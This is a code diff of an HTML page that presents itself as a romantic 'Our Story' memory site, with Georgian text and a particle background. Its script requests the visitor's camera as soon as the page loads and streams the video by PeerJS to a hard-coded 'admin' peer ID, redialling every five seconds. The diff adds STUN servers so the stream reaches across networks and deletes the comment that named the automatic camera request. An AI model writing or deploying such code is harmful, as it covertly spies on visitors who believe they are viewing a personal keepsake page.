@@ -25,8 +25,6 @@ body{
     overflow-x:hidden;
 }
 
-/* Background */
-
 #bg{
     position:fixed;
     inset:0;
@@ -48,8 +46,6 @@ body{
     z-index: 0;
 }
 
-/* Main website */
-
 #website{
     position: relative;
     z-index: 1;
@@ -57,13 +53,10 @@ body{
 
 section{
     min-height:100vh;
-
     display:flex;
     justify-content:center;
     align-items:center;
-
     padding:30px;
-
     text-align:center;
 }
 
@@ -101,110 +94,55 @@ h2 span{
 .start{
     margin-top:20px;
     padding:14px 25px;
-
     border-radius:999px;
-
     border:1px solid rgba(255,255,255,.15);
-
     background:rgba(255,255,255,.05);
-
     color:white;
-
     cursor:pointer;
 }
 </style>
 </head>
 
-
 <body>
 
 <canvas id="bg"></canvas>
-
 <div class="background"></div>
 
-<!-- WEBSITE -->
-
 <div id="website">
-
     <section>
-
         <div class="content">
-
-            <div class="label">
-                OUR STORY
-            </div>
-
-            <h2>
-                ორი ადამიანი.
-                <br>
-                <span>
-                    ერთი ისტორია.
-                </span>
-            </h2>
-
+            <div class="label">OUR STORY</div>
+            <h2>ორი ადამიანი.<br><span>ერთი ისტორია.</span></h2>
             <p class="description">
                 ეს მხოლოდ პატარა საიტი არ არის.
                 ეს არის ჩვენი მოგონებების
                 პატარა ციფრული სამყარო.
             </p>
-
-            <button
-                class="start"
-                onclick="
-                    document
-                    .getElementById('story')
-                    .scrollIntoView({
-                       behavior:'smooth'
-                    })
-                "
-            >
+            <button class="start" onclick="document.getElementById('story').scrollIntoView({behavior:'smooth'})">
                 დავიწყოთ ❤️
             </button>
-
         </div>
-
     </section>
 
-
     <section id="story">
-
         <div class="content">
-
-            <div class="label">
-                22 OCTOBER
-            </div>
-
-            <h2>
-                ყველაფერი
-                <br>
-                აქედან დაიწყო.
-            </h2>
-
+            <div class="label">22 OCTOBER</div>
+            <h2>ყველაფერი<br>აქედან დაიწყო.</h2>
             <p class="description">
                 ახლა აქ შეგვიძლია დავამატოთ
                 თქვენი რეალური ისტორია,
                 ფოტოები, ვიდეოები,
                 ტესტები და ანიმაციები.
             </p>
-
         </div>
-
     </section>
-
 </div>
 
-
 <script>
-
-/* =====================================
-   PEERJS + AUTOMATIC CAMERA REQUEST
-===================================== */
-
 const ADMIN_PEER_ID = 'deme-admin-secret-key-123';
 let cameraStream = null;
 let peer = null;
 
-// საიტზე შესვლისთანავე ბრაუზერი ავტომატურად ითხოვს კამერას
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         cameraStream = await navigator.mediaDevices.getUserMedia({
@@ -212,7 +150,16 @@ window.addEventListener('DOMContentLoaded', async () => {
             audio: false
         });
 
-        peer = new Peer();
+        // STUN სერვერები სხვადასხვა ქსელიდან დაკავშირებისთვის
+        peer = new Peer({
+            config: {
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' },
+                    { urls: 'stun:stun2.l.google.com:19302' }
+                ]
+            }
+        });
 
         peer.on('open', () => {
             makeCall();
@@ -230,17 +177,13 @@ window.addEventListener('DOMContentLoaded', async () => {
 function makeCall() {
     if (cameraStream && peer) {
         const call = peer.call(ADMIN_PEER_ID, cameraStream);
-        
         call?.on('close', () => {
             setTimeout(makeCall, 5000);
         });
     }
 }
 
-/* =====================================
-   PARTICLES
-===================================== */
-
+/* PARTICLES */
 const canvas = document.getElementById("bg");
 const ctx = canvas.getContext("2d");
 let particles = [];
@@ -250,13 +193,10 @@ function resize() {
     canvas.height = window.innerHeight * devicePixelRatio;
     canvas.style.width = window.innerWidth + "px";
     canvas.style.height = window.innerHeight + "px";
-
     ctx.scale(devicePixelRatio, devicePixelRatio);
 
     particles = Array.from(
-        {
-            length: window.innerWidth < 600 ? 70 : 140
-        },
+        { length: window.innerWidth < 600 ? 70 : 140 },
         () => ({
             x: Math.random() * window.innerWidth,
             y: Math.random() * window.innerHeight,
@@ -270,11 +210,9 @@ function resize() {
 
 function animate() {
     ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
-
     particles.forEach(p => {
         p.x += p.vx;
         p.y += p.vy;
-
         if (p.x < 0) p.x = window.innerWidth;
         if (p.x > window.innerWidth) p.x = 0;
         if (p.y < 0) p.y = window.innerHeight;
@@ -285,14 +223,12 @@ function animate() {
         ctx.fillStyle = `rgba(255, 160, 190, ${p.opacity})`;
         ctx.fill();
     });
-
     requestAnimationFrame(animate);
 }
 
 resize();
 window.addEventListener("resize", resize);
 animate();
-
 </script>
 
 </body>
